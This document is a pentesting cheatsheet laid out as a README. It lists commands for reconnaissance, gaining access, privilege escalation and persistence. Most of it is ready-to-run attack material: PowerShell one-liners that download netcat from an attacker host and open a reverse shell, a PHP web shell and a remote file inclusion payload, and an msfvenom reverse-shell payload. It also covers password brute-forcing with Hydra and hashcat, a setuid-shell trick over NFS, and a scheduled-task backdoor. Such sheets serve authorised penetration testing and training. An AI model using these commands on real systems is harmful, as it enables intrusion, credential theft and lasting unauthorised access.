# Offensive Security / PenTesting Cheatsheets
A collection of cheatsheets, convenience functions  and other useful snippets to aid during pentest engagement.
Disclaimer: I do not claim ownership of netcat and linux privilege escalation or reverse shell scripts.

## Reconnaissance / Enumeration

#### Extracting Live IPs from Nmap Scan
```bash
nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep "/open" | cut -d " " -f 2 > exposed-services-ips
```

#### DNS lookups, Zone Transfers & Brute-Force
```bash
whois domain.com
dig {a|txt|ns|mx} domain.com
dig {a|txt|ns|mx} domain.com @ns1.domain.com
host -t {a|txt|ns|mx} megacorpone.com
host -a megacorpone.com
host -l megacorpone.com ns1.megacorpone.com
dnsrecon -d megacorpone.com -t axfr @ns2.megacorpone.com
dnsenum domain.com
nslookup -> set type=any -> ls -d domain.com
for sub in $(cat subdomains.txt);do host $sub.domain.com|grep "has.address";done
```

#### Banner Grabbing
```bash
nc -v $TARGET 80
telnet $TARGET 80
curl -vX $TARGET
```

#### NFS Exported Shares
List NFS exported shares. If 'rw,no_root_squash' is present, upload and execute [sid-shell](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/sid-shell.c)
```bash
showmount -e 192.168.110.102
chown root:root sid-shell; chmod +s sid-shell
```

#### Kerberos User Enumeration
```bash
nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'
```


#### HTTP Brute-Force & Vulnerability Scanning
```bash
target=10.0.0.1; gobuster -u http://$target -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 150 -l | tee $target-gobuster
target=10.0.0.1; nikto -h http://$target:80 | tee $target-nikto
target=10.0.0.1; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum
```

#### RPC / NetBios / SMB
```bash
rpcinfo -p $TARGET
nbtscan $TARGET

#list shares
smbclient -L //$TARGET -U ""

# null session
rpcclient -U "" $TARGET
smbclient -L //$TARGET
enum4linux $TARGET
```

#### SNMP
```bash

# Windows User Accounts
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25

# Windows Running Programs
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2

# Windows Hostname
snmpwalk -c public -v1 $TARGET .1.3.6.1.2.1.1.5

# Windows Share Information
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.3.1.1

# Windows Share Information
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.27

# Windows TCP Ports
snmpwalk -c public -v1 $TARGET4 1.3.6.1.2.1.6.13.1.3

# Software Name
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.6.3.1.2

# brute-force community strings
onesixtyone -i snmp-ips.txt -c community.txt

snmp-check $TARGET
```

#### SMTP
```bash
smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150
```

## Gaining Access

#### Uploading/POSTing Files Through WWW Upload Forms
```bash
# POST file
curl -X POST -F "file=@/file/location/shell.php" http://$TARGET/upload.php --cookie "cookie"

# POST binary data to web form
curl -F "field=<shell.zip" http://$TARGET/upld.php -F 'k=v' --cookie "k=v;" -F "submit=true" -L -v
```

#### Generating Payload Pattern & Calculating Offset
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $EIP_VALUE
```

#### Cracking Passwords

##### Cracking Web Forms with Hydra
```bash
hydra 10.10.10.52 http-post-form -L /usr/share/wordlists/list "/endpoit/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s PORT -P /usr/share/wordlists/list 
````

##### Cracking Common Protocols with Hydra
```bash
hydra 10.10.10.52 -l username -P /usr/share/wordlists/list ftp|ssh|smb://10.0.0.1
````

##### HashCat Cracking
```bash
# Bruteforce based on the pattern;
hashcat -a3 -m0 "e99a18c428cb38d5f260853678922e03" ?l?l?l?d?d?d --force  
 
# Generate password candidates: wordlist + pattern;
hashcat -a6 -m0 "e99a18c428cb38d5f260853678922e03" yourPassword|/usr/share/wordlists/rockyou.txt ?d?d?d?u?u?u --force --potfile-disable –stdout 
```


#### Generating Payload with msfvenom
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.245 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
```

#### Compiling Code From Linux
```bash
# Windows
i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe

# Linux
gcc -m32|-m64 -o output source.c
```

#### Local File Inclusion to Shell
```php
# Vulnerable web app on Windows + PHP through contaminated logs
nc $WINDOWSTARGET 80

# Send as HTTP request
<?php system($_GET['cmd']);?>

# Send as cmd=
powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe" }
```
#### Remote File InclusionShell: Windows + PHP
```php
<?php system("powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile('http://10.11.0.245/netcat/nc.exe','nc.exe'); cmd /c nc.exe 10.11.0.245 4444 -e cmd.exe\" }"); ?>
```

## Local Enumeration & Privilege Escalation

#### Binary Exploitation with ImmunityDebugger

##### Get Loaded Modules
```
# We're interested in modules without protection, Read & Execute permissions
!mona modules
```

##### Finding JMP ESP Address
```
!mona find -s "\xFF\xE4" -m moduleName
```

#### Cracking a ZIP Password
```bash 
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip
```

#### Setting up Simple HTTP server
```bash
# Linux
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -r webrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S 0.0.0.0:80
```


#### Uploading Files to Target Machine

##### TFTP
```bash
#TFTP Linux: cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftp
service atftpd start

# Windows
tftp -i $ATTACKER get /download/location/file /save/location/file
```

##### FTP
```bash
# Linux: set up ftp server with anonymous logon access;
twistd -n ftp -p 21 -r /file/to/serve

# Windows shell: read FTP commands from ftp-commands.txt non-interactively;
echo open $ATTACKER>ftp-commands.txt
echo anonymous>>ftp-commands.txt
echo whatever>>ftp-commands.txt
echo binary>>ftp-commands.txt
echo get file.exe>>ftp-commands.txt
echo bye>>ftp-commands.txt 
ftp -s:ftp-commands.txt
```

##### HTTP: Powershell
```PowerShell
powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe" }
powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'" }
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe')"; Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'"
powershell (New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/file.exe','file.exe');(New-Object -com Shell.Application).ShellExecute('file.exe');
```

##### HTTP: VBScript
Copy and paste contents of [wget.vbs](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/wget-cscript) into a Windows Shell and then:
```
cscript wget.vbs http://$ATTACKER/file.exe localfile.exe
```

##### HTTP: Linux
```bash
wget http://$ATTACKER/file
curl http://$ATTACKER/file
scp ~/file/file.bin user@$TARGET:tmp/backdoor.py
```

##### NetCat
```Bash
# Attacker
nc -l -p 4444 < /tool/file.exe

# Victim
nc $ATTACKER 4444 > file.exe
```

##### HTTP: Windows "debug.exe" Method

```bash
# 1. In Linux, convert binary to hex ascii:
wine /usr/share/windows-binaries/exe2bat.exe /root/tools/netcat/nc.exe nc.txt
# 2. Paste nc.txt into Windows Shell.
```

##### HTTP: Windows BitsAdmin
```bash
cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://$ATTACKER/payload.exe %tmp%\payload.exe&start %tmp%\payload.exe
```

#### Bash Ping Sweeper
```bash
#!/bin/bash
for lastOctet in {1..254}; do 
    ping -c 1 10.0.0.$lastOctet | grep "bytes from" | cut -d " " -f 4 | cut -d ":" -f 1 &
done
```

#### Brute-forcing XOR'ed string with 1 byte key in Python
```python
encrypted = "encrypted-string-here"
for i in range(0,255):
    print("".join([chr(ord(e) ^ i) for e in encrypted]))
```

#### Generating Bad Character Strings
```python
# Python
'\\'.join([ "x{:02x}".format(i) for i in range(1,256) ])
```

```bash
# Bash
for i in {1..255}; do printf "\\\x%02x" $i; done
```

#### Converting Python to Windows Executable (.py -> .exe)
```bash
python pyinstaller.py --onefile convert-to-exe.py
```

#### Port Scanning with NetCat
```bash
nc -nvv -w 1 -z host 1000-2000
nc -nv -u -z -w 1 host 160-162
```

#### Finding Vulnerable Windows Services
```
# Look for SERVICE_ALL_ACCESS in the output
accesschk.exe -uwcqv "user-you-have-shell-with" *
```


#### Port Forwarding / SSH Tunneling

##### SSH: Local Port Forwarding
```bash
# Listen on local port 8080 and forward incoming traffic to REMOT_HOST:PORT via SSH_SERVER
# Scenario: access a host that's being blocked by a firewall via SSH_SERVER;
ssh -L 127.0.0.1:8080:REMOTE_HOST:PORT user@SSH_SERVER
```
##### SSH: Dynamic Port Forwarding
```bash
# Listen on local port 8080. Incoming traffic to 127.0.0.1:8080 forwards it to final destination via SSH_SERVER
# Scenario: proxy your web traffic through SSH tunnel OR access hosts on internal network via a compromised DMZ box;
ssh -D 127.0.0.1:8080 user@SSH_SERVER
```
##### SSH: Remote Port Forwarding
```bash
# Open port 5555 on SSH_SERVER. Incoming traffic to SSH_SERVER:5555 is tunneled to LOCALHOST:3389
# Scenario: expose RDP on non-routable network;
ssh -R 5555:LOCAL_HOST:3389 user@SSH_SERVER
```
##### Proxy Tunnel
```bash
# Open a local port 127.0.0.1:5555. Incoming traffic to 5555 is proxied to DESTINATION_HOST through PROXY_HOST:3128
# Scenario: a remote host has SSH running, but it's only bound to 127.0.0.1, but you want to reach it;
proxytunnel -p PROXY_HOST:3128 -d DESTINATION_HOST:22 -a 5555
ssh user@127.0.0.1 -p 5555
```
##### HTTP Tunnel: SSH Over HTTP
```bash
# Server - open port 80. Redirect all incoming traffic to localhost:80 to localhost:22
hts -F localhost:22 80

# Client - open port 8080. Redirect all incoming traffic to localhost:8080 to 192.168.1.15:80
htc -F 8080 192.168.1.15:80

# Client - connect to localhost:8080 -> get tunneled to 192.168.1.15:80 -> get redirected to 192.168.1.15:22
ssh localhost -p 8080
```

#### RunAs / Start Process As: Powershell
```powershell
$username = 'Administrator';$password = '1234test';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Invoke-Command -Credential $credential -ComputerName COMPUTER_NAME -Command { whoami } 
```

#### Recursively Find Hidden Files: Windows
```bash
dir /A:H /s "c:\program files"
```

#### General File Search
```bash
# Query the local db for a quick file find. Run updatedb before executing locate.
locate passwd 

# Show which file would be executed in the current environment, depending on $PATH environment variable;
which nc wget curl php perl python netcat tftp telnet ftp

# Search for *.conf (case-insensitive) files recursively starting with /etc;
find /etc -iname *.conf
```

## Maintaining Access
#### Persistent Back Doors
```
# Launch evil.exe every 10 minutes
schtasks /create /sc minute /mo 10 /tn "TaskName" /tr C:\Windows\system32\evil.exe
```

This is inspired and based on [Dostoevsky's Pentest Notes](https://github.com/dostoevskylabs/dostoevsky-pentest-notes).
